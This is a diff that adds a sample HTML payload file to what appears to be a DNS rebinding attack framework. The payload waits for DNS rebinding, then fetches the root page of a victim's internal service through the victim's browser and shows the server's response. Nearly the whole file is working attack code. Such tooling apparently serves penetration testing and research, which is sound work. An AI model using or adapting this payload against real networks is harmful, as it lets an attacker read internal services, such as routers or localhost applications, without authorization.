@@ -1,0 +1,61 @@
+<!--
+This is a sample payload to make a simple GET request and display the response.
+Copy the content of this file to a new .html file and add its name to the
+`attackPayloads` list in the manager-config.json file.
+-->
+<!doctype html>
+<html>
+<head>
+<title>payload-simple-get</title>
+<script src="payload.js"></script>
+<script>
+/**
+ * The attack() function is called when the user clicks the "Start Attack" button.
+ */
+function attack() {
+	/* Send a GET request to '/' (the root web directory) to the IP address and
+	port defined in the manager UI. */
+	fetch('/')
+		.then(responseOKOrFail("Could not submit a request to get a list of keys"))
+		.then(function (response) { // we successfully received the server response
+			if (response.includes(indextoken) == false) {
+				clearInterval(timer); // stop the attack timer
+				console.log("SUCCESS"); // log to the console
+				// Terminate the attack:
+				// - display the response in a JavaScript alert()
+				// - write the response to the JavaScript console
+				attackSuccess("Server response: "+response);
+			} else {
+				// We saw the token in the response. DNS Rebinding did not happen.
+				// Let's wait for the next time.
+				throw new Error('hastoken');
+			}
+		})
+		.catch(function (error) {
+			if (error instanceof TypeError) { // We cannot establish an HTTP connection
+				console.log("frame " + window.location.hostname + " could not load");
+				window.parent.postMessage({
+					status: "error",
+				}, "*")
+			} else if (error.message == 'hastoken') {
+				console.log('DNS rebinding did not happen yet')
+			} else if (error.message == '404') { // We received a 404
+				console.log("file not found. Frame " + window.location.hostname +
+					" has not updated dns yet, waiting " + interval +
+					" ms")
+			} else { // We did not handle something
+				console.log('Unhandled error: ' + error);
+			}
+		});
+}
+</script>
+</head>
+<body onload="begin()">
+    <p>
+        <h3>DNS Rebinding Vulnerability Simple GET Payload</h3>
+    </p>
+    <p>
+        This page is waiting for a DNS update.
+    </p>
+</body>
+</html>
